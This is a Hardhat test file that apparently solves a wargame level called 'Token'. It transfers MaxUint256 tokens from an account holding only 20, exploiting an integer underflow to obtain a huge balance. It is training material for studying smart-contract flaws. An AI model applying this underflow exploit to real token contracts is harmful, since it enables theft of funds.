import {expect} from "./utils/chai-setup";
import {ethers, deployments, getNamedAccounts} from 'hardhat';
import { Deployment } from "hardhat-deploy/dist/types";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import {setup} from './utils/index';
import type { Token } from '../typechain-types';

/**Goal: You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens. */

describe('Token', () => {
  let deployer: SignerWithAddress;
  let user1: SignerWithAddress;
  let user2: SignerWithAddress;
  let token: Token;

  beforeEach(async () => {
    ({deployer, user1, user2} = await setup());

    await deployments.fixture(['token']);

    const TokenDeployment: Deployment = await deployments.get('Token');
    token = await Promise.resolve(ethers.getContractAt('Token', TokenDeployment.address) as Promise<Token>);
  });


  it('Takes control of entire token balance', async () => {
    await token.transfer(user1.address, ethers.BigNumber.from('20'));
    expect(await token.balanceOf(deployer.address)).to.equal(ethers.BigNumber.from('980'));
    expect(await token.balanceOf(user1.address)).to.equal(ethers.BigNumber.from('20'));

    await token.connect(user1).transfer(
      user2.address, 
      ethers.constants.MaxUint256
    );

    console.log('bal: ', (await token.balanceOf(user2.address)).toString());


  });

});
